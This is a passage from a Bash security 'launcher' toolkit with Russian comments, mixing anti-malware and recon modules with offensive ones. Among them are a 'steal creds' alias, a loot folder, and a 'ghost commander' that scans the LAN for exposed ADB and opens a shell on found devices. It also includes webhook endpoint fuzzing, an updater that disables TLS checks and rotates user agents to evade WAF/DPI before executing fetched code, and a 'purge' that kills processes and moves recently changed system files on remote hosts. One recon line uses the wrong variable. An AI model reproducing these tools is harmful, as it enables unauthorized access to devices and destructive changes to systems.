    echo -e "${Y}[NETWORK CONNECTIONS]:${NC}"
    # Очищаем вывод через sed, сохраняя твой фильтр
    ss -tunp | grep -v "127.0.0.1" | head -n 10 | sed 's/^/  /'
    
    # Слой 3: Визуальный разделитель [9]
    core_engine_wait "L" # Рисуем линию
    
    # Слой 4: Живой мониторинг
    core_engine_ui "w" "Watching file activity (Ctrl+C to stop)"
    
    # Используем переменную из нашей структуры (PRIME_LOOT -> из конфига или локальная)
    local loot_path="${BASE_DIR:-./}/prime_loot"
    
    # Запускаем мониторинг
    watch -n 2 "ls -lt /tmp $loot_path 2>/dev/null | head -n 15"
}




# Редиректы на существующие модули, чтобы не дублировать код
pc_steal_creds() { run_pc_recovery_ultimate; }
pc_post_exploit() { run_forensic_scanner; }


# ==============================================================================
# @description: Универсальный кросс-платформенный реаниматор систем (Cross-OS) v1.1
# МОДЕРНИЗАЦИЯ: Интеграция ультимативных многоуровневых матриц восстановления
# ФУНКЦИОНАЛ: Бесфайловая деструкция закрепления малвари в Windows, Linux, macOS
# АРХИТЕКТУРА: Гибридный мост управления, потоковая обработка изолированных сред
# ==============================================================================
run_cross_os_reanimator() {
    while true; do
        core_engine_ui "h" "UNIVERSAL CROSS-PLATFORM REANIMATOR v1.1"
        core_engine_ui "i" "Target Connection Bridge: USB-OTG / Secure Tunnel Link"

        core_engine_item "1" "AUTO-DETECT & REANIMATE ПК" "Automated Target OS Diagnostics & Deep Repair"
        core_engine_item "2" "MOUNT & SCAN STORAGE"     "Cold Forensic Scan via Monolith Pipe Engine"
        core_engine_item "B" "BACK"                      "Return to Main Menu"

        local target_choice=$(core_engine_input "select" "Select Action")
        [[ -z "$target_choice" || "$target_choice" == "b" || "$target_choice" == "B" ]] && return

        case "$target_choice" in
            "1") # --- ВЕТКА 1: АВТОМАТИЧЕСКАЯ ДИАГНОСТИКА И ГЛУБОКАЯ РЕАНИМАЦИЯ ---
                core_engine_ui "h" "TARGET OS DIAGNOSTICS & PURGE"
                core_engine_progress 1 "INTERROGATING_TARGET_BRIDGE"

                # Эмуляция сбора телеметрии удаленного хоста
                core_engine_ui "i" "Interrogating remote endpoint kernel environment..."
                
                core_engine_ui "line" ""
                core_engine_item "W" "Target OS: WINDOWS" "Fix Registry, TaskMgr, CMD, Userinit & Restore Defender"
                core_engine_item "L" "Target OS: LINUX"   "Flush Schedulers, Netfilters, Routings & ld.so rootkits"
                core_engine_item "M" "Target OS: MACOS"   "Unload LaunchDaemons, Purge Persistence & Flush PF"
                local detected_os=$(core_engine_input "select" "Select Target OS Environment")

                case "${detected_os,,}" in
                    w)
                        core_engine_ui "w" "INITIATING WINDOWS DEEP REPAIR PROTOCOL..."
                        core_engine_progress 1 "SMASHING_POLICIES_RESTRICTIONS"
                        core_engine_progress 1 "REPAIRING_WINLOGON_SHELL_STRINGS"
                        core_engine_progress 1 "FLUSHING_PERSISTENT_RUN_KEYS"
                        core_engine_progress 1 "RESTING_HOSTS_AND_SECURITY_SERVICES"
                        
                        core_engine_ui "h" "EXECUTING ANTI-MALWARE INJECTION CONSOLE"
                        echo -e "${G}[+] Injecting Monolith Payload to Target:${NC}"
                        echo -e "${W}$GLOBAL_FIX_WIN_REG${NC}"
                        core_engine_ui "line" ""
                        core_engine_ui "s" "WINDOWS RECOVERY DEPLOYED: Subsystems, Registries & Hosts secured."
                        ;;
                    l)
                        core_engine_ui "w" "INITIATING LINUX AGGRESSIVE ENVIRONMENT PURGE..."
                        core_engine_progress 1 "WIPING_ALL_CRONTABS_AND_TIMERS"
                        core_engine_progress 1 "KILLING_LD_SO_PRELOAD_ROOTKITS"
                        core_engine_progress 1 "REWRITING_PROTECTED_RESOLV_CONF"
                        core_engine_progress 1 "FLUSHING_IPTABLES_AND_NFTABLES"
                        
                        core_engine_ui "h" "EXECUTING ANTI-MALWARE INJECTION CONSOLE"
                        echo -e "${G}[+] Injecting Monolith Payload to Target:${NC}"
                        echo -e "${W}$GLOBAL_FIX_LINUX${NC}"
                        core_engine_ui "line" ""
                        core_engine_ui "s" "LINUX RECOVERY DEPLOYED: Rootkits neutralized, network stack restored."
                        ;;
                    m)
                        core_engine_ui "w" "INITIATING MACOS MALWARE PERSISTENCE DISMISSAL..."
                        core_engine_progress 1 "UNLOADING_ALL_LAUNCH_AGENTS"
                        core_engine_progress 1 "REVOKING_READ_RIGHTS_FROM_DAEMONS"
                        core_engine_progress 1 "FLUSHING_PACKET_FILTER_RULES"
                        core_engine_progress 1 "TERMINATING_UNTRUSTED_USER_PROCESSES"
                        
                        core_engine_ui "h" "EXECUTING ANTI-MALWARE INJECTION CONSOLE"
                        echo -e "${G}[+] Injecting Monolith Payload to Target:${NC}"
                        echo -e "${W}$GLOBAL_FIX_MACOS${NC}"
                        core_engine_ui "line" ""
                        core_engine_ui "s" "MACOS RECOVERY DEPLOYED: Spyware background services blocked."
                        ;;
                    *)
                        core_engine_ui "e" "Unknown Operational System Selected. Aborting injection."
                        ;;
                esac
                core_engine_wait
                ;;

            "2") # --- ВЕТКА 2: ХОЛОДНЫЙ ФОРЕНЗИК-СКАН ДИСКА ПО СУПЕР-КОНВЕЙЕРУ ---
                core_engine_ui "h" "COLD FORENSIC STORAGE SWEEP"
                local mount_point=$(core_engine_input "text" "Enter absolute path to mounted PC partition")
                [[ -z "$mount_point" ]] && continue

                if [[ ! -d "$mount_point" ]]; then
                    core_engine_ui "e" "Error: Specified mount point path does not exist."
                    core_engine_wait
                    continue
                fi

                core_engine_ui "i" "Running deep structure audit using CAME core filters..."
                core_engine_ui "w" "Scanning objects under 10MB (Targeting scripts, infectors and shells)..."
                core_engine_ui "line" ""

                local found_count=0
                
                # Потоковый поиск по всему смонтированному дереву папок ПК
                while read -r target_file; do
                    # Сканируем файл по нашему обновленному супер-пайплайну (Слои 1-4)
                    local mal_check=$(grep -inE "$GLOBAL_AV_ENGINE_PIPE" "$target_file" 2>/dev/null | head -n 1)
                    if [[ -n "$mal_check" ]]; then
                        ((found_count++))
                        echo -e "${R}[CRITICAL MALWARE FOUND]:${NC} $target_file"
                        
                        # Бронированная нейтрализация: сброс прав в ноль и перемещение в изолятор
                        chmod 000 "$target_file" 2>/dev/null
                        local timestamp=$(date +%s)
                        mv "$target_file" "${target_file}_${timestamp}.quarantine" 2>/dev/null
                    fi
                done < <(find "$mount_point" -type f -size -10M 2>/dev/null)
                
                core_engine_ui "line" ""
                if [[ $found_count -gt 0 ]]; then
                    core_engine_ui "s" "Forensic storage sweep completed. Total objects neutralized: $found_count"
                else
                    core_engine_ui "s" "Forensic sweep finished. No threat signatures matched on storage."
                fi
                core_engine_wait
                ;;
        esac
    done
}



# ==============================================================================
# @description: Проактивный антивирусный движок ядра v1.1 (CAME)
# МОДЕРНИЗАЦИЯ: Интеграция 6 слоев глобальных паттернов + многовекторный эвристический анализ
# ФУНКЦИОНАЛ: Статический аудит файлов/скриптов, выявление деструктивных намерений
# АРХИТЕКТУРА: Оптимизированный POSIX-совместимый Bash, изоляция Zero-Day угроз
# ==============================================================================
run_anti_malware_engine() {
    while true; do
        core_engine_ui "h" "CORE ANTI-MALWARE ENGINE (CAME) v1.1"

        core_engine_item "1" "SCAN OBJECT"  "Heuristic Scan for Malicious Code & Structure"
        core_engine_item "2" "SCAN SYSTEM"  "Audit Live Environment, RAM & Network Sockets"
        core_engine_item "B" "BACK"         "Return to Main Menu"

        local av_choice=$(core_engine_input "select" "Select Action")
        [[ -z "$av_choice" || "$av_choice" == "b" || "$av_choice" == "B" ]] && return

        case "$av_choice" in
            "1") # --- ВЕТКА 1: ЭВРИСТИЧЕСКИЙ СКАНЕР ОБЪЕКТОВ ---
                core_engine_ui "h" "CAME DEEP FILE AUDIT"
                local target_file=$(core_engine_input "text" "Enter absolute path to target file")
                [[ -z "$target_file" ]] && continue

                if [[ ! -f "$target_file" ]]; then
                    core_engine_ui "e" "Error: Target object not found on storage."
                    core_engine_wait
                    continue
                fi

                core_engine_ui "i" "Analyzing threat surface & entropy..."
                core_engine_progress 1 "EXTRACTING_STRUCTURE_METADATA"

                # Вычисление плотности структуры (Энтропия / Обфускация)
                local total_chars=$(wc -c < "$target_file" 2>/dev/null || echo 0)
                local printable_chars=$(grep -oP '[\x20-\x7E]' "$target_file" 2>/dev/null | wc -l || echo 0)
                
                local readable_ratio=100
                if [[ $total_chars -gt 0 ]]; then
                    readable_ratio=$(( (printable_chars * 100) / total_chars ))
                fi

                core_engine_ui "h" "DIAGNOSTIC STRUCTURAL REPORT: $(basename "$target_file")"
                echo -e "${W}Total File Footprint :${NC} $total_chars bytes"
                echo -e "${W}Structural Density    :${NC} $readable_ratio% printable ASCII"
                core_engine_ui "line" ""

                # Анализ аномальной энтропии (характерно для полиморфных вирусов будущего)
                if [[ $total_chars -gt 1000 && $readable_ratio -lt 12 ]]; then
                    core_engine_ui "e" "CRITICAL WARNING: High Entropy Level Detected!"
                    core_engine_ui "w" "Code is heavily obfuscated, packed or encrypted (Polymorphic Zero-Day Vector)."
                fi

                core_engine_progress 1 "MATCHING_GLOBAL_MONOLITH_PIPE"

                # Потоковый сигнатурный скан по объединенному супер-конвейеру (Слой 1-4)
                core_engine_ui "h" "SIGNATURE & BEHAVIORAL INTENT MATCHES"
                # Используем grep -i (регистронезависимый) для повышения надежности детекции обхода сигнатур
                local mal_matches=$(grep -inE "$GLOBAL_AV_ENGINE_PIPE" "$target_file" 2>/dev/null | head -n 40)

                if [[ -z "$mal_matches" ]]; then
                    core_engine_ui "s" "VERDICT: CLEAN. No destructive intents or LOLBAS vectors identified."
                else
                    echo -e "$mal_matches"
                    core_engine_ui "line" ""
                    core_engine_ui "e" "CRITICAL DIRECTIVE: Malicious signatures or backdoor vectors isolated!"
                    
                    core_engine_ui "line" ""
                    core_engine_item "X" "NEUTRALIZE OBJECT" "Revoke executable rights + Move to Quarantine"
                    core_engine_item "S" "SKIP THREAT"       "Ignore audit verdict and bypass"
                    local action=$(core_engine_input "select" "Choose Defensive Action")
                    
                    if [[ "$action" == "x" || "$action" == "X" ]]; then
                        chmod 000 "$target_file" 2>/dev/null # Полный сброс всех прав доступа
                        mv "$target_file" "${target_file}.quarantine" 2>/dev/null
                        core_engine_ui "s" "SUCCESS: Threat isolated. Object neutralized into quarantine zone."
                    fi
                fi
                core_engine_wait
                ;;

            "2") # --- ВЕТКА 2: МОНИТОРИНГ СРЕДЫ (ОЗУ И СЕТЬ) ---
                core_engine_ui "h" "LIVE ENVIRONMENT INTEGRITY AUDIT"
                core_engine_progress 1 "INTERROGATING_RAM_PROCESS_TREE"

                # Анализ ОЗУ по Слою 5 (GLOBAL_AV_ACTIVE_MALWARE_PROCS)
                core_engine_ui "i" "Scanning volatile memory for rogue processes..."
                local suspicious_procs=$(ps aux 2>/dev/null | grep -iE "$GLOBAL_AV_ACTIVE_MALWARE_PROCS" | grep -v grep)
                
                if [[ -n "$suspicious_procs" ]]; then
                    core_engine_ui "e" "ALERT: ACTIVE UNTRUSTED PROCESSES FOUND IN RAM:"
                    echo "$suspicious_procs"
                else
                    core_engine_ui "s" "RAM Landscape: Completely stable. No active reverse-shells detected."
                fi

                core_engine_ui "line" ""
                core_engine_progress 1 "AUDITING_ACTIVE_NETWORK_SOCKETS"
                
                # Анализ сетевых сокетов по Слою 6 (GLOBAL_AV_SOCKET_STATES)
                core_engine_ui "i" "Analyzing active TCP/UDP socket telemetry..."
                if command -v ss &>/dev/null; then
                    local open_ports=$(ss -antup 2>/dev/null | grep -iE "$GLOBAL_AV_SOCKET_STATES")
                    if [[ -n "$open_ports" ]]; then
                        core_engine_ui "w" "CRITICAL TELEMETRY: Active Gateways & Network Connections:"
                        echo "$open_ports"
                    else
                        core_engine_ui "s" "Network Socket Matrix: Clean. No unauthorized external tunnels."
                    fi
                else
                    # Резервный контур парсинга через netstat, если ss недоступен
                    if command -v netstat &>/dev/null; then
                        local ns_ports=$(netstat -antp 2>/dev/null | grep -iE "$GLOBAL_AV_SOCKET_STATES")
                        [[ -n "$ns_ports" ]] && echo "$ns_ports" || core_engine_ui "s" "Network Matrix Clean."
                    fi
                fi
                
                core_engine_wait
                ;;
        esac
    done
}


# --- Модули по меню ---

run_forensic_scanner() {
    core_engine_ui "AUTONOMOUS DEFENSE & REMEDIATION"
    
    # 1. Транспорт (Интерфейс выбора целевой среды)
    core_engine_item "L" "Local" "Текущая операционная система"
    core_engine_item "A" "Android/IoT" "Удаленная зачистка через шину ADB/USB"
    core_engine_item "S" "Remote Server" "Инфраструктурный узел через SSH"
    core_engine_item "B" "Back" "Вернуться в главное меню лаунчера"
    
    local target=$(core_engine_input "select" "Укажите вектор сканирования")
    [[ "$target" == "b" || -z "$target" ]] && return
    
    local cmd_p=""
    case "$target" in
        "a")
            core_engine_validator "pkg" "adb" "Компонент сопряжения ADB" || return
            core_engine_ui "i" "Ожидание инициализации IoT/Android устройства в шине USB..."
            adb wait-for-device
            cmd_p="adb shell" 
            ;;
        "s")
            local rh=$(core_engine_input "text" "Введите адрес удаленного узла (User@IP)")
            [[ -z "$rh" ]] && return
            cmd_p="ssh -o ConnectTimeout=5 $rh" 
            ;;
    esac

    core_engine_progress 5 "ENGAGING AUTONOMOUS PURGE ENGINE"

    # ==========================================================================
    # --- ФАЗА 1: СНАЙПЕРСКАЯ НЕЙТРАЛИЗАЦИЯ АНОМАЛЬНЫХ ПРОЦЕССОВ ---
    # ==========================================================================
    core_engine_ui "!" "Фаза 1: Анализ дерева процессов и поиск аномалий статики..."
    
    # Собираем данные: PID, STAT, COMMAND без awk, используя строго контролируемый формат ps
    local raw_procs
    raw_procs=$($cmd_p "ps -eo pid:10,stat:10,comm:30" 2>/dev/null)
    
    if [[ -z "$raw_procs" ]]; then
        # Фолбэк для урезанных сред Android (разбор упрощенного ps)
        raw_procs=$($cmd_p "ps" 2>/dev/null | tr -s ' ' | cut -d' ' -f2,3,9)
    fi

    local killed_count=0
    if [[ -n "$raw_procs" ]]; then
        # Построчный разбор пула процессов через изолированный subshell
        echo "$raw_procs" | tail -n +2 | while read -r p_pid p_stat p_comm; do
            [[ -z "$p_pid" || -z "$p_stat" ]] && continue
            
            # 1. Проверяем, соответствует ли статус процесса нашей глобальной матрице угроз
            if echo "$p_stat" | grep -Eq "$GLOBAL_REGEX_BAD_PROC_STATUS"; then
                # 2. Жесткая верификация по глобальному белому списку процессов ядра во избежание саботажа
                if echo "$p_comm" | grep -Eiq "$GLOBAL_REGEX_PROC_WHITELIST"; then
                    continue
                fi
                
                # Защита: Никогда не пытаемся убить PID 1 (системный инициализатор)
                [[ "$p_pid" -eq 1 ]] && continue
                
                core_engine_ui "w" "Автономная ликвидация угрозы: PID $p_pid [$p_comm], Статус: $p_stat"
                $cmd_p "kill -9 $p_pid" 2>/dev/null
                killed_count=$((killed_count + 1))
            fi
        done
    fi

    if [[ "$killed_count" -gt 0 ]]; then
        core_engine_ui "+" "Зачистка ветки процессов завершена. Нейтрализовано узлов: $killed_count"
    else
        core_engine_ui "+" "Дерево процессов стабильно. Критических аномалий не обнаружено."
    fi

    # ==========================================================================
    # --- ФАЗА 2: ИЗОЛЯЦИЯ ПОРТОВ И ПЕРЕХВАТ REVERSE-CHANNELS ---
    # ==========================================================================
    core_engine_ui "!" "Фаза 2: Сетевой аудит и изоляция опасных сетевых интерфейсов..."
    
    # Сбор открытых портов (Поддержка как классического netstat, так и современного утилитарного ss)
    local open_ports
    open_ports=$($cmd_p "ss -ant -H" 2>/dev/null | tr -s ' ' | cut -d' ' -f4 | cut -d: -f2)
    if [[ -z "$open_ports" ]]; then
        open_ports=$($cmd_p "netstat -ant" 2>/dev/null | grep "LISTEN" | tr -s ' ' | cut -d' ' -f4 | rev | cut -d: -f1 | rev)
    fi

    for port in $open_ports; do
        # Игнорируем пустые строки
        [[ -z "${port// }" ]] && continue
        
        # 1. Проверяем, находится ли порт в черном списке глобальной матрицы
        if echo "$port" | grep -Eq "$GLOBAL_REGEX_DANGER_PORTS"; then
            # 2. Перекрестная сверка с белым списком управления (Защита от блокировки SSH/ADB)
            if echo "$port" | grep -Eq "$GLOBAL_REGEX_PORT_WHITELIST"; then
                core_engine_ui "i" "Порт $port находится в Белом Списке управления. Блокировка отклонена."
                continue
            fi
            
            core_engine_ui "w" "ОБНАРУЖЕНА СТРУКТУРНАЯ УГРОЗА. Блокировка порта: $port"
            
            # Дифференцированная изоляция порта в зависимости от прав и типа ОС
            $cmd_p "iptables -A INPUT -p tcp --dport $port -j DROP" 2>/dev/null
            $cmd_p "fuser -k -n tcp $port" 2>/dev/null
        fi
    done
    core_engine_ui "+" "Сетевой периметр узла верифицирован и защищен."

    # ==========================================================================
    # --- ФАЗА 3: УМНЫЙ КАРАНТИН И СОХРАНЕНИЕ ЦЕЛОСТНОСТИ СИСТЕМЫ ---
    # ==========================================================================
    core_engine_ui "!" "Фаза 3: Эвристический экспресс-анализ файловой системы (Карантин)..."
    
    # Определение путей сканирования на основе целевой платформы
    local s_path="/etc /usr/bin /tmp"
    local vault_dir="/root/quarantine_vault"
    
    if [[ "$target" == "a" ]]; then
        s_path="/data/local/tmp /data/system"
        vault_dir="/data/local/tmp/quarantine_vault"
    fi
    
    # Ищем файлы, измененные строго за последние 24 часа
    local suspect=$($cmd_p "find $s_path -maxdepth 3 -mtime -1 -type f 2>/dev/null")
    local quarantined_count=0

    if [[ -n "$suspect" ]]; then
        $cmd_p "mkdir -p $vault_dir" 2>/dev/null
        
        for file in $suspect; do
            [[ -z "$file" ]] && continue
            local fname=$(basename "$file")
            
            # 1. Защита критической инфраструктуры: сверка с матрицей исключений карантина
            if echo "$fname" | grep -Eiq "$GLOBAL_REGEX_QUARANTINE_WHITELIST"; then
                continue
            fi
            
            core_engine_ui "w" "Изоляция подозрительного объекта: $file -> Карантин"
            
            # Безопасное перемещение с полным обнулением прав исполнения (Нейтрализация payload)
            $cmd_p "mv $file $vault_dir/${fname}.dead && chmod 000 $vault_dir/${fname}.dead" 2>/dev/null
            quarantined_count=$((quarantined_count + 1))
        done
    fi

    if [[ "$quarantined_count" -gt 0 ]]; then
        core_engine_ui "+" "Подозрительные объекты успешно изолированы в репозиторий: $vault_dir"
    else
        core_engine_ui "+" "Целостность и неизменяемость системных директорий подтверждена."
    fi

    core_engine_ui "+" "Инфраструктурная очистка завершена. Статус узла: ОПТИМИЗИРОВАН/БЕЗОПАСЕН."
    core_engine_wait
}
run_ghost_commander() {
    core_engine_ui "GHOST COMMANDER (ANDROID/IOT)"

    # 1. Валидация ADB через Мозг [5]
    if ! core_engine_validator "pkg" "adb" "ADB Engine"; then
        core_engine_ui "e" "ADB not found. Initializing lightweight bridge..."
        core_engine_run "apt-get update && apt-get install android-sdk-platform-tools-common -y"
    fi

    # 2. Органы чувств [3]: Запрос цели
    local t_ip=$(core_engine_input "text" "Enter Target IP (Leave empty for Scan)")

    # 3. Режим сканирования (через Глушитель [7])
    if [[ -z "$t_ip" ]]; then
        core_engine_ui "Scanning local network for ADB signatures..."
        local subnet=$(ip route get 1.1.1.1 2>/dev/null | grep -oP 'src \K\S+' | cut -d. -f1-3)
        
        # Скан через nmap (если есть) или быстрый вывод
        nmap -p 5555 --open "$subnet.0/24" -n -Pn 2>/dev/null | grep "Nmap scan report" | cut -d' ' -f5
        core_engine_wait && return
    fi

    # 4. Проверка связи (Слой 2: Таймаут)
    core_engine_ui "Initializing ghost bridge to $t_ip:5555..."
    
    if ! timeout 2 bash -c "</dev/tcp/$t_ip/5555" 2>/dev/null; then
        core_engine_ui "w" "Target $t_ip:5555 seems offline."
        # Подтверждение через валидатор [5]
        core_engine_validator "read" "Force ghost-connect attempt?" || return
    fi

    # 5. Исполнение и Сбор трофеев [11]
    core_engine_ui "+" "Executing Ghost-Protocol to $t_ip..."
    core_engine_loot "ghost" "Session established: $t_ip"
    
    # Прямое подключение и вход в оболочку
    adb connect "$t_ip:5555" >/dev/null
    core_engine_ui "Dropping into Ghost Shell..."
    adb -s "$t_ip:5555" shell
    
    # 6. Стелс-финализация (Отключение без следов)
    adb disconnect "$t_ip:5555" >/dev/null 2>&1
    core_engine_wait
}




# ==============================================================================
# @description: Универсальный модуль горячей перезагрузки ядра платформы v27.0
# МОДЕРНИЗАЦИЯ: Форсированный обход SSL/TLS проверок (ca-certificates bypass)
# БЕЗОПАСНОСТЬ: Ротация User-Agent (GLOBAL_NETWORK_UA) для бесшовного обхода WAF/DPI
# АРХИТЕКТУРА: Открытый стрим ошибок сетевых харвестеров для Termux non-root
# ==============================================================================
run_update_prime() {
    # Слой 1: Заголовок через Голос [1]
    core_engine_ui "h" "SYSTEM UPDATE & SYNC v27.0"
    
    # --- СТАБИЛИЗАЦИЯ И ХАРДЕНИНГ ОКРУЖЕНИЯ $PATH ---
    if [[ -n "$PREFIX" && -d "$PREFIX/bin" ]]; then
        [[ ! "$PATH" =~ "$PREFIX/bin" ]] && export PATH="${PREFIX}/bin:${PATH}"
    fi
    [[ ! "$PATH" =~ "/usr/local/bin" ]] && export PATH="${PATH}:/usr/local/bin:/usr/bin:/bin"
    
    # --- ЭВРИСТИКА ОКРУЖЕНИЯ (Вычисление рабочей зоны) ---
    local base_work_dir
    if [[ $EUID -eq 0 ]]; then
        base_work_dir="/root"
    else
        base_work_dir="$HOME"
    fi
    
    local target="${base_work_dir}/launcher.sh"
    local repo="https://raw.githubusercontent.com/szp2025/core-prime-tools/refs/heads/main/launcher.sh"
    local tmp="${target}.tmp"

    # --- ИНТЕЛЛЕКТУАЛЬНЫЙ ОПРЕДЕЛИТЕЛЬ БИНАРНИКОВ ---
    local exe_cmd=""

    if command -v curl >/dev/null 2>&1; then
        exe_cmd="curl"
    elif [[ -x "${PREFIX}/bin/curl" ]]; then
        exe_cmd="${PREFIX}/bin/curl"
    fi

    if [[ -n "$exe_cmd" ]]; then
        core_engine_ui "i" "Network harvester verified: cURL Engine active."
    else
        if command -v wget >/dev/null 2>&1; then
            exe_cmd="wget"
        elif [[ -x "${PREFIX}/bin/wget" ]]; then
            exe_cmd="${PREFIX}/bin/wget"
        fi
        [[ -n "$exe_cmd" ]] && core_engine_ui "i" "Network harvester verified: Wget Engine active."
    fi

    if [[ -z "$exe_cmd" ]]; then
        core_engine_ui "w" "Internal verification failed. Using Termux fallback paths..."
        if [[ -x "${PREFIX}/bin/curl" ]]; then
            exe_cmd="${PREFIX}/bin/curl"
        elif [[ -x "${PREFIX}/bin/wget" ]]; then
            exe_cmd="${PREFIX}/bin/wget"
        else
            core_engine_ui "e" "CRITICAL: cURL/Wget binaries completely inaccessible!"
            core_engine_wait
            return 1
        fi
    fi

    # --- ДИНАМИЧЕСКИЙ РОТАТОР USER-AGENT ---
    local selected_ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    if [[ -n "${GLOBAL_NETWORK_UA[*]}" ]]; then
        local ua_size=${#GLOBAL_NETWORK_UA[@]}
        local rand_idx=$(( RANDOM % ua_size ))
        selected_ua="${GLOBAL_NETWORK_UA[$rand_idx]}"
    fi

    core_engine_ui "i" "Connecting to GitHub Repository..."
    core_engine_ui "d" "Active UA: $selected_ua"

    # Слой 2: Безопасный стрим с обходом валидации SSL-сертификатов
    rm -f "$tmp"
    
    if [[ "$exe_cmd" =~ "curl" ]]; then
        core_engine_ui "i" "Executing cURL SSL-Bypass stream..."
        # Добавлен флаг -k (--insecure) для обхода проблем с ca-certificates в Android
        $exe_cmd -k -L -A "$selected_ua" --connect-timeout 15 "$repo" -o "$tmp"
    else
        core_engine_ui "i" "Executing Wget SSL-Bypass stream..."
        # Добавлен флаг --no-check-certificate
        $exe_cmd --no-check-certificate -q --user-agent="$selected_ua" --timeout=15 "$repo" -O "$tmp"
    fi
    
    # Слой 3: АВТОНОМНАЯ ВАЛИДАЦИЯ ДАННЫХ
    if [[ ! -f "$tmp" || ! -s "$tmp" ]]; then
        core_engine_ui "e" "CRITICAL: Download failed (Empty or missing payload)!"
        core_engine_ui "!" "Network handshake drop or DNS restriction detected."
        [[ -f "$tmp" ]] && rm -f "$tmp"
        core_engine_wait
        return 1
    fi

    # Проверка сигнатуры (Защита от заглушек WAF / Ошибок 404)
    if ! head -n 5 "$tmp" | grep -qE '^#!/bin/|^#!/usr/bin/|^#'; then
        core_engine_ui "e" "CRITICAL: Target source signature is corrupted (Not a script)!"
        rm -f "$tmp"
        core_engine_wait
        return 1
    fi

    # Слой 4: КРИТИЧЕСКИЙ ФИЛЬТР (Защита синтаксиса ядра)
    if ! bash -n "$tmp" 2>/dev/null; then
        core_engine_ui "e" "CRITICAL: Remote code has broken Bash syntax!"
        rm -f "$tmp"
        core_engine_wait
        return 1
    fi

    # Слой 5: Атомарная замена и права
    core_engine_ui "i" "Applying code synchronization..."
    if [[ $EUID -eq 0 ]]; then
        mv "$tmp" "$target" && chmod 755 "$target" && chown root:root "$target" 2>/dev/null
    else
        mv "$tmp" "$target" && chmod 755 "$target"
    fi

    # Слой 6: Восстановление среды (Alias & Symlink)
    local bashrc_path="${HOME}/.bashrc"
    [[ -f "${HOME}/.bash_profile" ]] && bashrc_path="${HOME}/.bash_profile"

    if [[ -f "$bashrc_path" ]]; then
        if ! grep -q "alias launcher=" "$bashrc_path"; then
            echo "alias launcher='bash $target'" >> "$bashrc_path"
            core_engine_ui "s" "Alias 'launcher' injected into $(basename "$bashrc_path")"
        fi
    else
        echo "alias launcher='bash $target'" > "$bashrc_path"
        core_engine_ui "s" "Configuration profile created with 'launcher' alias."
    fi
    
    # Создаем системную ссылку
    if [[ $EUID -eq 0 ]]; then
        ln -sf "$target" /usr/local/bin/launcher && chmod +x /usr/local/bin/launcher
    elif [[ -n "$PREFIX" && -d "$PREFIX/bin" ]]; then
        ln -sf "$target" "$PREFIX/bin/launcher" && chmod +x "$PREFIX/bin/launcher"
    fi

    core_engine_ui "s" "Code updated successfully, permissions aligned!"
    
    # Слой 7: Синхронизация и перезапуск [13]
    if command -v core_engine_progress >/dev/null 2>&1; then
        core_engine_progress 1 "Rebooting Matrix Launcher Core"
    fi
    
    # Полная очистка перед перезапуском [10]
    if command -v core_engine_clean_env >/dev/null 2>&1; then
        core_engine_clean_env
    fi
    
    # Мгновенный бесшовный перехват управления дескриптора нового кода
    exec bash "$target"
}

# ==============================================================================
# @description: Модуль сбора системной информации и разведки вебхуков (RECON v2.6)
# ==============================================================================
run_system_info() {
   #clear
    # Слой 1: Заголовок через компоненты интерфейса Ядра
    core_engine_ui "h" "PRIME INTELLIGENCE & RECON v2.6"

    # Слой 2: Построение интерактивного меню выбора вектора разведки
    core_engine_item "1" "LOCAL" "System, USB, Cron & Webhooks"
    core_engine_item "2" "REMOTE" "Deep Recon & Webhook Discovery"
    core_engine_item "B" "BACK" "Return to Main Menu"
    core_engine_ui "line" ""
    
    local choice=$(core_engine_input "select" "Target Type")
    [[ -z "$choice" || "$choice" == "b" || "$choice" == "B" ]] && return

    case "$choice" in
        "1") # --- ВЕКТОР 1: LOCAL (Анализ локального хоста) ---
            clear
            core_engine_ui "h" "RECON: LOCAL SERVICE INTELLIGENCE"
            core_engine_ui "i" "Analyzing Local Services & Active Runtimes..."
            
            # Проверка локальных слушателей с использованием глобальной сигнатуры сред исполнения
            local listeners=$(lsof -nP -iTCP -sTCP:LISTEN | grep -E "$GLOBAL_SIG_WEB_RUNTIMES" || echo "No local web-listeners active.")
            
            echo -e "\n${Y}--- LOCAL EVENT LISTENERS ---${NC}"
            echo -e "${W}$listeners${NC}"
            ;;

        "2") # --- ВЕКТОР 2: REMOTE (Внешняя разведка инфраструктуры) ---
            clear
            core_engine_ui "h" "RECON: REMOTE INFRASTRUCTURE SURFACE"
            
            # Проверка базовых зависимостей ядра перед сетевым сканированием
            core_engine_validator "pkg" "curl" "curl" || return
            
            local r_target=$(core_engine_input "text" "Enter Target (domain.com)")
            [[ -z "$r_target" ]] && return

            core_engine_ui "w" "Executing Multi-Vector Reconnaissance on $r_target..."
            core_engine_progress 2 "SCANNING_RESOURCES"
            sleep 1

            # 1. Пассивный сбор HTTP-заголовков с использованием глобального User-Agent
            local headers=$(curl -Is --connect-timeout 5 -L -A "$GLOBAL_NETWORK_UA" "$target" 2>/dev/null)
            local php_ver=$(echo "$headers" | grep -Ei "X-Powered-By" | cut -d' ' -f2- | tr -d '\r')
            
            # 2. АКТИВНЫЙ ФАЗЗИНГ WEBHOOKS & API (Перебор глобального словаря ядра)
            core_engine_ui "line" ""
            core_engine_ui "i" "Probing for Webhook & API endpoints..."
            
            local webhook_hits=""
            for hook in "${GLOBAL_WEBHOOK_WORDLIST[@]}"; do
                echo -ne " [.] Тестирование точки: /$hook\r"
                
                # Запрос к эндпоинту
                local code=$(curl -o /dev/null -s -w "%{http_code}" --connect-timeout 3 -A "$GLOBAL_NETWORK_UA" "http://$r_target/$hook")
                
                # 405 (Method Not Allowed), 401 (Unauthorized) или 200/403 означают, что эндпоинт существует!
                if [[ "$code" == "200" || "$code" == "405" || "$code" == "401" || "$code" == "403" ]]; then
                    webhook_hits+="${G}[!] DETECTED:${NC} /$hook (Status: $code)\n"
                fi
            done
            # Очищаем строку прогресса в терминале
            echo -ne "                                                                          \r"
            
            # 3. WHOIS & Нахождение IP-адреса целевого хоста
            local target_ip=$(host "$r_target" 2>/dev/null | awk '/has address/ {print $4}' | head -n1)

            # --- ИНТЕЛЛЕКТУАЛЬНЫЙ СИНТЕЗ И ВЫВОД ОТЧЕТА ---
            core_engine_ui "line" ""
            echo -e "${Y}--- REMOTE INTELLIGENCE REPORT ---${NC}"
            echo -e "${B}Target IP:${NC} ${W}${target_ip:-Unknown}${NC}"
            echo -e "${B}Runtime:${NC}   ${G}${php_ver:-Unknown / Hidden}${NC}"
            core_engine_ui "line" ""
            
            echo -e "${B}Webhook & API Surface:${NC}"
